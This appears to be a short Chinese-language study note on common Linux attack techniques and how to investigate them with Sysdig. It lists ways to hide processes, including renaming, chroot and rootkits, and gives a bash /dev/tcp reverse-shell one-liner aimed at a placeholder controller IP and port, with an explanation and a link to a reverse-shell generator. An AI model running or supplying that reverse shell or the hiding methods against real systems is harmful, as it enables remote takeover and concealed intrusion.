---
title: 常见攻击手段和排查
---
包含 nc 反弹shell 等常见攻击手段 使用Sysdig进行排查



Sysdig : Open Source Universal System Visibility With Native Contaier Support.

虽然 Linux 有很多系统分析和调优的工具 如strace、tcpdump、htop、iftop、lsof、netstat，但是它们一般都负责某个特殊的功能，并且使用方式有很大的差异，如果要分析和定位问题，一般都需要熟练掌握需要命令的使用。而且这些工具的数据无法进行共享，只能相互独立工作。Sysdig 一个工具就能实现上述所有工具的功能，并且提供了统一的使用语法。



CPU、Memory、Disk IO、网络 IO•支持各种 IO 活动：进程、文件、网络连接等

来分析这些数据



Sysdig 有着类似于 tcpdump 的过滤语法，用户可以随意组合自己的过滤逻辑，用户还可以自己编写 Lua 脚本来自定义分析逻辑，基本上不受任何限制。



https://mp.weixin.qq.com/s/j4vfelk1Eu-rl2s8B70_CQ







Linux 隐藏进程的方法有以下几种：

- 修改进程名：通过修改进程名，使进程不易被发现。可以使用命令行工具如 ps、top 来查看进程名。修改进程名可以使用命令 prctl 或 setproctitle。

- 修改进程所在目录：可以将进程所在目录修改为一个隐藏目录，使进程不易被发现。可以使用 chroot 命令将进程所在目录修改为一个隔离的目录。

- 修改进程权限：可以修改进程的权限，使其只能被 root 用户或者某个特定用户访问。可以使用 chmod 命令修改进程权限。

- 使用 rootkit 技术：rootkit 是一种用于隐藏进程和文件的恶意软件。可以使用 rootkit 技术隐藏进程。


反弹shell
一个反弹shell生成器 https://github.com/0dayCTF/reverse-shell-generator

例如：
```bash
bash -i >& /dev/tcp/控制端IP/控制端端口 0>&1
```
这个命令的作用是将标准输入、输出和错误重定向到一个 TCP 连接，从而实现反弹 shell。具体来说，该命令将标准输出和错误输出都重定向到一个 TCP 连接，并将标准输入重定向到标准输出和错误输出的合并，从而使得攻击者可以通过控制端口向目标机器发送命令并获取输出，实现反弹 shell 的效果。  
https://unix.stackexchange.com/questions/521596/what-does-the-01-shell-redirection-mean